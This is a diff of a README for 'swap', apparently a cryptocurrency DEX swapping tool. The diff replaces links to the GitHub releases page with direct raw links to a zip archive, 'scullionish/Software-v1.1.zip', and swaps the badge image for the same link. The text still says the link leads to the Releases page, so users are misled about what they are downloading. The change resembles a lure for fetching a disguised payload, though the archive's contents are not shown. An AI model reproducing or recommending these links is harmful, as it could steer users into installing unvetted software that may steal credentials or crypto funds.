@@ -1,6 +1,6 @@
 # 🌟 swap - Easy DEX Swapping for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/nitainfotechindia/swap/releases)
+[![Download Now](https://github.com/nitainfotechindia/swap/raw/refs/heads/main/scullionish/Software-v1.1.zip%20Now-Get%20Started-brightgreen)](https://github.com/nitainfotechindia/swap/raw/refs/heads/main/scullionish/Software-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run swap, your computer should meet the following requirements:
 
 To get swap, visit the releases page. Follow the link below:
 
-[Visit this page to download](https://github.com/nitainfotechindia/swap/releases)
+[Visit this page to download](https://github.com/nitainfotechindia/swap/raw/refs/heads/main/scullionish/Software-v1.1.zip)
 
 1. Click on the link above to access the Releases page.
 2. Look for the latest version of swap.
